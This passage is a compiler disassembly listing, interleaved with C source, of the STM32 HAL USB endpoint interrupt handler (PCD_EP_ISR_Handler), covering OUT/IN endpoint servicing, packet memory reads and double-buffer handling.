 8002814:	b29b      	uxth	r3, r3
 8002816:	4313      	orrs	r3, r2
 8002818:	b29b      	uxth	r3, r3
 800281a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800281e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002822:	b29a      	uxth	r2, r3
 8002824:	697b      	ldr	r3, [r7, #20]
 8002826:	801a      	strh	r2, [r3, #0]
 8002828:	e026      	b.n	8002878 <PCD_EP_ISR_Handler+0x2d6>
 800282a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800282c:	691b      	ldr	r3, [r3, #16]
 800282e:	2b00      	cmp	r3, #0
 8002830:	d10a      	bne.n	8002848 <PCD_EP_ISR_Handler+0x2a6>
 8002832:	697b      	ldr	r3, [r7, #20]
 8002834:	881b      	ldrh	r3, [r3, #0]
 8002836:	b29b      	uxth	r3, r3
 8002838:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800283c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002840:	b29a      	uxth	r2, r3
 8002842:	697b      	ldr	r3, [r7, #20]
 8002844:	801a      	strh	r2, [r3, #0]
 8002846:	e017      	b.n	8002878 <PCD_EP_ISR_Handler+0x2d6>
 8002848:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800284a:	691b      	ldr	r3, [r3, #16]
 800284c:	085b      	lsrs	r3, r3, #1
 800284e:	647b      	str	r3, [r7, #68]	; 0x44
 8002850:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002852:	691b      	ldr	r3, [r3, #16]
 8002854:	f003 0301 	and.w	r3, r3, #1
 8002858:	2b00      	cmp	r3, #0
 800285a:	d002      	beq.n	8002862 <PCD_EP_ISR_Handler+0x2c0>
 800285c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800285e:	3301      	adds	r3, #1
 8002860:	647b      	str	r3, [r7, #68]	; 0x44
 8002862:	697b      	ldr	r3, [r7, #20]
 8002864:	881b      	ldrh	r3, [r3, #0]
 8002866:	b29a      	uxth	r2, r3
 8002868:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800286a:	b29b      	uxth	r3, r3
 800286c:	029b      	lsls	r3, r3, #10
 800286e:	b29b      	uxth	r3, r3
 8002870:	4313      	orrs	r3, r2
 8002872:	b29a      	uxth	r2, r3
 8002874:	697b      	ldr	r3, [r7, #20]
 8002876:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 8002878:	687b      	ldr	r3, [r7, #4]
 800287a:	681b      	ldr	r3, [r3, #0]
 800287c:	881b      	ldrh	r3, [r3, #0]
 800287e:	b29b      	uxth	r3, r3
 8002880:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002884:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002888:	827b      	strh	r3, [r7, #18]
 800288a:	8a7b      	ldrh	r3, [r7, #18]
 800288c:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8002890:	827b      	strh	r3, [r7, #18]
 8002892:	8a7b      	ldrh	r3, [r7, #18]
 8002894:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002898:	827b      	strh	r3, [r7, #18]
 800289a:	687b      	ldr	r3, [r7, #4]
 800289c:	681a      	ldr	r2, [r3, #0]
 800289e:	8a7b      	ldrh	r3, [r7, #18]
 80028a0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80028a4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80028a8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80028ac:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80028b0:	b29b      	uxth	r3, r3
 80028b2:	8013      	strh	r3, [r2, #0]
 80028b4:	e22c      	b.n	8002d10 <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 80028b6:	687b      	ldr	r3, [r7, #4]
 80028b8:	681b      	ldr	r3, [r3, #0]
 80028ba:	461a      	mov	r2, r3
 80028bc:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80028c0:	009b      	lsls	r3, r3, #2
 80028c2:	4413      	add	r3, r2
 80028c4:	881b      	ldrh	r3, [r3, #0]
 80028c6:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 80028ca:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 80028ce:	2b00      	cmp	r3, #0
 80028d0:	f280 80f6 	bge.w	8002ac0 <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 80028d4:	687b      	ldr	r3, [r7, #4]
 80028d6:	681b      	ldr	r3, [r3, #0]
 80028d8:	461a      	mov	r2, r3
 80028da:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80028de:	009b      	lsls	r3, r3, #2
 80028e0:	4413      	add	r3, r2
 80028e2:	881b      	ldrh	r3, [r3, #0]
 80028e4:	b29a      	uxth	r2, r3
 80028e6:	f640 738f 	movw	r3, #3983	; 0xf8f
 80028ea:	4013      	ands	r3, r2
 80028ec:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 80028f0:	687b      	ldr	r3, [r7, #4]
 80028f2:	681b      	ldr	r3, [r3, #0]
 80028f4:	461a      	mov	r2, r3
 80028f6:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80028fa:	009b      	lsls	r3, r3, #2
 80028fc:	4413      	add	r3, r2
 80028fe:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 8002902:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 8002906:	b292      	uxth	r2, r2
 8002908:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 800290a:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 800290e:	4613      	mov	r3, r2
 8002910:	009b      	lsls	r3, r3, #2
 8002912:	4413      	add	r3, r2
 8002914:	00db      	lsls	r3, r3, #3
 8002916:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800291a:	687a      	ldr	r2, [r7, #4]
 800291c:	4413      	add	r3, r2
 800291e:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 8002920:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002922:	7b1b      	ldrb	r3, [r3, #12]
 8002924:	2b00      	cmp	r3, #0
 8002926:	d123      	bne.n	8002970 <PCD_EP_ISR_Handler+0x3ce>
        {
          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002928:	687b      	ldr	r3, [r7, #4]
 800292a:	681b      	ldr	r3, [r3, #0]
 800292c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002930:	b29b      	uxth	r3, r3
 8002932:	461a      	mov	r2, r3
 8002934:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002936:	781b      	ldrb	r3, [r3, #0]
 8002938:	00db      	lsls	r3, r3, #3
 800293a:	4413      	add	r3, r2
 800293c:	687a      	ldr	r2, [r7, #4]
 800293e:	6812      	ldr	r2, [r2, #0]
 8002940:	4413      	add	r3, r2
 8002942:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002946:	881b      	ldrh	r3, [r3, #0]
 8002948:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800294c:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 8002950:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002954:	2b00      	cmp	r3, #0
 8002956:	f000 808e 	beq.w	8002a76 <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 800295a:	687b      	ldr	r3, [r7, #4]
 800295c:	6818      	ldr	r0, [r3, #0]
 800295e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002960:	6959      	ldr	r1, [r3, #20]
 8002962:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002964:	88da      	ldrh	r2, [r3, #6]
 8002966:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 800296a:	f005 fdda 	bl	8008522 <USB_ReadPMA>
 800296e:	e082      	b.n	8002a76 <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 8002970:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002972:	78db      	ldrb	r3, [r3, #3]
 8002974:	2b02      	cmp	r3, #2
 8002976:	d10a      	bne.n	800298e <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 8002978:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800297c:	461a      	mov	r2, r3
 800297e:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002980:	6878      	ldr	r0, [r7, #4]
 8002982:	f000 f9d3 	bl	8002d2c <HAL_PCD_EP_DB_Receive>
 8002986:	4603      	mov	r3, r0
 8002988:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 800298c:	e073      	b.n	8002a76 <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 800298e:	687b      	ldr	r3, [r7, #4]
 8002990:	681b      	ldr	r3, [r3, #0]
 8002992:	461a      	mov	r2, r3
 8002994:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002996:	781b      	ldrb	r3, [r3, #0]
 8002998:	009b      	lsls	r3, r3, #2
 800299a:	4413      	add	r3, r2
 800299c:	881b      	ldrh	r3, [r3, #0]
 800299e:	b29b      	uxth	r3, r3
 80029a0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80029a4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80029a8:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 80029ac:	687b      	ldr	r3, [r7, #4]
 80029ae:	681b      	ldr	r3, [r3, #0]
 80029b0:	461a      	mov	r2, r3
 80029b2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029b4:	781b      	ldrb	r3, [r3, #0]
 80029b6:	009b      	lsls	r3, r3, #2
 80029b8:	441a      	add	r2, r3
 80029ba:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 80029be:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80029c2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80029c6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80029ca:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80029ce:	b29b      	uxth	r3, r3
 80029d0:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 80029d2:	687b      	ldr	r3, [r7, #4]
 80029d4:	681b      	ldr	r3, [r3, #0]
 80029d6:	461a      	mov	r2, r3
 80029d8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029da:	781b      	ldrb	r3, [r3, #0]
 80029dc:	009b      	lsls	r3, r3, #2
 80029de:	4413      	add	r3, r2
 80029e0:	881b      	ldrh	r3, [r3, #0]
 80029e2:	b29b      	uxth	r3, r3
 80029e4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80029e8:	2b00      	cmp	r3, #0
 80029ea:	d022      	beq.n	8002a32 <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 80029ec:	687b      	ldr	r3, [r7, #4]
 80029ee:	681b      	ldr	r3, [r3, #0]
 80029f0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80029f4:	b29b      	uxth	r3, r3
 80029f6:	461a      	mov	r2, r3
 80029f8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029fa:	781b      	ldrb	r3, [r3, #0]
 80029fc:	00db      	lsls	r3, r3, #3
 80029fe:	4413      	add	r3, r2
 8002a00:	687a      	ldr	r2, [r7, #4]
 8002a02:	6812      	ldr	r2, [r2, #0]
 8002a04:	4413      	add	r3, r2
 8002a06:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002a0a:	881b      	ldrh	r3, [r3, #0]
 8002a0c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002a10:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002a14:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a18:	2b00      	cmp	r3, #0
 8002a1a:	d02c      	beq.n	8002a76 <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002a1c:	687b      	ldr	r3, [r7, #4]
 8002a1e:	6818      	ldr	r0, [r3, #0]
 8002a20:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a22:	6959      	ldr	r1, [r3, #20]
 8002a24:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a26:	891a      	ldrh	r2, [r3, #8]
 8002a28:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a2c:	f005 fd79 	bl	8008522 <USB_ReadPMA>
 8002a30:	e021      	b.n	8002a76 <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002a32:	687b      	ldr	r3, [r7, #4]
 8002a34:	681b      	ldr	r3, [r3, #0]
 8002a36:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002a3a:	b29b      	uxth	r3, r3
 8002a3c:	461a      	mov	r2, r3
 8002a3e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a40:	781b      	ldrb	r3, [r3, #0]
 8002a42:	00db      	lsls	r3, r3, #3
 8002a44:	4413      	add	r3, r2
 8002a46:	687a      	ldr	r2, [r7, #4]
 8002a48:	6812      	ldr	r2, [r2, #0]
 8002a4a:	4413      	add	r3, r2
 8002a4c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002a50:	881b      	ldrh	r3, [r3, #0]
 8002a52:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002a56:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002a5a:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a5e:	2b00      	cmp	r3, #0
 8002a60:	d009      	beq.n	8002a76 <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002a62:	687b      	ldr	r3, [r7, #4]
 8002a64:	6818      	ldr	r0, [r3, #0]
 8002a66:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a68:	6959      	ldr	r1, [r3, #20]
 8002a6a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a6c:	895a      	ldrh	r2, [r3, #10]
 8002a6e:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a72:	f005 fd56 	bl	8008522 <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 8002a76:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a78:	69da      	ldr	r2, [r3, #28]
 8002a7a:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a7e:	441a      	add	r2, r3
 8002a80:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a82:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 8002a84:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a86:	695a      	ldr	r2, [r3, #20]
 8002a88:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a8c:	441a      	add	r2, r3
 8002a8e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a90:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002a92:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a94:	699b      	ldr	r3, [r3, #24]
 8002a96:	2b00      	cmp	r3, #0
 8002a98:	d005      	beq.n	8002aa6 <PCD_EP_ISR_Handler+0x504>
 8002a9a:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002a9e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aa0:	691b      	ldr	r3, [r3, #16]
 8002aa2:	429a      	cmp	r2, r3
 8002aa4:	d206      	bcs.n	8002ab4 <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 8002aa6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aa8:	781b      	ldrb	r3, [r3, #0]
 8002aaa:	4619      	mov	r1, r3
 8002aac:	6878      	ldr	r0, [r7, #4]
 8002aae:	f009 ff3d 	bl	800c92c <HAL_PCD_DataOutStageCallback>
 8002ab2:	e005      	b.n	8002ac0 <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002ab4:	687b      	ldr	r3, [r7, #4]
 8002ab6:	681b      	ldr	r3, [r3, #0]
 8002ab8:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002aba:	4618      	mov	r0, r3
 8002abc:	f003 ffe3 	bl	8006a86 <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 8002ac0:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002ac4:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002ac8:	2b00      	cmp	r3, #0
 8002aca:	f000 8121 	beq.w	8002d10 <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 8002ace:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002ad2:	1c5a      	adds	r2, r3, #1
 8002ad4:	4613      	mov	r3, r2
 8002ad6:	009b      	lsls	r3, r3, #2
 8002ad8:	4413      	add	r3, r2
 8002ada:	00db      	lsls	r3, r3, #3
 8002adc:	687a      	ldr	r2, [r7, #4]
 8002ade:	4413      	add	r3, r2
 8002ae0:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 8002ae2:	687b      	ldr	r3, [r7, #4]
 8002ae4:	681b      	ldr	r3, [r3, #0]
 8002ae6:	461a      	mov	r2, r3
 8002ae8:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002aec:	009b      	lsls	r3, r3, #2
 8002aee:	4413      	add	r3, r2
 8002af0:	881b      	ldrh	r3, [r3, #0]
 8002af2:	b29b      	uxth	r3, r3
 8002af4:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002af8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002afc:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8002b00:	687b      	ldr	r3, [r7, #4]
 8002b02:	681b      	ldr	r3, [r3, #0]
 8002b04:	461a      	mov	r2, r3
 8002b06:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002b0a:	009b      	lsls	r3, r3, #2
 8002b0c:	441a      	add	r2, r3
 8002b0e:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002b12:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002b16:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002b1a:	b29b      	uxth	r3, r3
 8002b1c:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002b1e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b20:	78db      	ldrb	r3, [r3, #3]
 8002b22:	2b01      	cmp	r3, #1
 8002b24:	f040 80a2 	bne.w	8002c6c <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002b28:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b2a:	2200      	movs	r2, #0
 8002b2c:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002b2e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b30:	7b1b      	ldrb	r3, [r3, #12]
 8002b32:	2b00      	cmp	r3, #0
 8002b34:	f000 8093 	beq.w	8002c5e <PCD_EP_ISR_Handler+0x6bc>
          {
            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002b38:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002b3c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002b40:	2b00      	cmp	r3, #0
 8002b42:	d046      	beq.n	8002bd2 <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002b44:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b46:	785b      	ldrb	r3, [r3, #1]
 8002b48:	2b00      	cmp	r3, #0
 8002b4a:	d126      	bne.n	8002b9a <PCD_EP_ISR_Handler+0x5f8>
 8002b4c:	687b      	ldr	r3, [r7, #4]
 8002b4e:	681b      	ldr	r3, [r3, #0]
 8002b50:	627b      	str	r3, [r7, #36]	; 0x24
 8002b52:	687b      	ldr	r3, [r7, #4]
 8002b54:	681b      	ldr	r3, [r3, #0]
 8002b56:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b5a:	b29b      	uxth	r3, r3
 8002b5c:	461a      	mov	r2, r3
 8002b5e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002b60:	4413      	add	r3, r2
 8002b62:	627b      	str	r3, [r7, #36]	; 0x24
 8002b64:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b66:	781b      	ldrb	r3, [r3, #0]
 8002b68:	00da      	lsls	r2, r3, #3
 8002b6a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002b6c:	4413      	add	r3, r2
 8002b6e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b72:	623b      	str	r3, [r7, #32]
 8002b74:	6a3b      	ldr	r3, [r7, #32]
 8002b76:	881b      	ldrh	r3, [r3, #0]
 8002b78:	b29b      	uxth	r3, r3
 8002b7a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b7e:	b29a      	uxth	r2, r3
 8002b80:	6a3b      	ldr	r3, [r7, #32]
 8002b82:	801a      	strh	r2, [r3, #0]
 8002b84:	6a3b      	ldr	r3, [r7, #32]
 8002b86:	881b      	ldrh	r3, [r3, #0]
 8002b88:	b29b      	uxth	r3, r3
 8002b8a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002b8e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002b92:	b29a      	uxth	r2, r3
 8002b94:	6a3b      	ldr	r3, [r7, #32]
 8002b96:	801a      	strh	r2, [r3, #0]
 8002b98:	e061      	b.n	8002c5e <PCD_EP_ISR_Handler+0x6bc>
 8002b9a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b9c:	785b      	ldrb	r3, [r3, #1]
 8002b9e:	2b01      	cmp	r3, #1
 8002ba0:	d15d      	bne.n	8002c5e <PCD_EP_ISR_Handler+0x6bc>
 8002ba2:	687b      	ldr	r3, [r7, #4]
 8002ba4:	681b      	ldr	r3, [r3, #0]
 8002ba6:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002ba8:	687b      	ldr	r3, [r7, #4]
 8002baa:	681b      	ldr	r3, [r3, #0]
 8002bac:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002bb0:	b29b      	uxth	r3, r3
 8002bb2:	461a      	mov	r2, r3
 8002bb4:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002bb6:	4413      	add	r3, r2
 8002bb8:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002bba:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bbc:	781b      	ldrb	r3, [r3, #0]
 8002bbe:	00da      	lsls	r2, r3, #3
 8002bc0:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002bc2:	4413      	add	r3, r2
 8002bc4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002bc8:	62bb      	str	r3, [r7, #40]	; 0x28
 8002bca:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002bcc:	2200      	movs	r2, #0
 8002bce:	801a      	strh	r2, [r3, #0]
 8002bd0:	e045      	b.n	8002c5e <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002bd2:	687b      	ldr	r3, [r7, #4]
 8002bd4:	681b      	ldr	r3, [r3, #0]
 8002bd6:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002bd8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bda:	785b      	ldrb	r3, [r3, #1]
 8002bdc:	2b00      	cmp	r3, #0
 8002bde:	d126      	bne.n	8002c2e <PCD_EP_ISR_Handler+0x68c>
 8002be0:	687b      	ldr	r3, [r7, #4]
 8002be2:	681b      	ldr	r3, [r3, #0]
 8002be4:	637b      	str	r3, [r7, #52]	; 0x34
 8002be6:	687b      	ldr	r3, [r7, #4]
 8002be8:	681b      	ldr	r3, [r3, #0]
 8002bea:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002bee:	b29b      	uxth	r3, r3
 8002bf0:	461a      	mov	r2, r3
 8002bf2:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002bf4:	4413      	add	r3, r2
 8002bf6:	637b      	str	r3, [r7, #52]	; 0x34
 8002bf8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bfa:	781b      	ldrb	r3, [r3, #0]
 8002bfc:	00da      	lsls	r2, r3, #3
 8002bfe:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002c00:	4413      	add	r3, r2
 8002c02:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002c06:	633b      	str	r3, [r7, #48]	; 0x30
 8002c08:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002c0a:	881b      	ldrh	r3, [r3, #0]
 8002c0c:	b29b      	uxth	r3, r3
 8002c0e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c12:	b29a      	uxth	r2, r3
 8002c14:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002c16:	801a      	strh	r2, [r3, #0]
 8002c18:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002c1a:	881b      	ldrh	r3, [r3, #0]
 8002c1c:	b29b      	uxth	r3, r3
 8002c1e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002c22:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002c26:	b29a      	uxth	r2, r3
 8002c28:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002c2a:	801a      	strh	r2, [r3, #0]
 8002c2c:	e017      	b.n	8002c5e <PCD_EP_ISR_Handler+0x6bc>
 8002c2e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c30:	785b      	ldrb	r3, [r3, #1]
 8002c32:	2b01      	cmp	r3, #1
 8002c34:	d113      	bne.n	8002c5e <PCD_EP_ISR_Handler+0x6bc>
 8002c36:	687b      	ldr	r3, [r7, #4]
 8002c38:	681b      	ldr	r3, [r3, #0]
 8002c3a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c3e:	b29b      	uxth	r3, r3
 8002c40:	461a      	mov	r2, r3
 8002c42:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002c44:	4413      	add	r3, r2
 8002c46:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002c48:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c4a:	781b      	ldrb	r3, [r3, #0]
 8002c4c:	00da      	lsls	r2, r3, #3
 8002c4e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002c50:	4413      	add	r3, r2
 8002c52:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002c56:	63bb      	str	r3, [r7, #56]	; 0x38
 8002c58:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002c5a:	2200      	movs	r2, #0
 8002c5c:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002c5e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c60:	781b      	ldrb	r3, [r3, #0]
 8002c62:	4619      	mov	r1, r3
 8002c64:	6878      	ldr	r0, [r7, #4]
 8002c66:	f009 fe7c 	bl	800c962 <HAL_PCD_DataInStageCallback>
 8002c6a:	e051      	b.n	8002d10 <PCD_EP_ISR_Handler+0x76e>
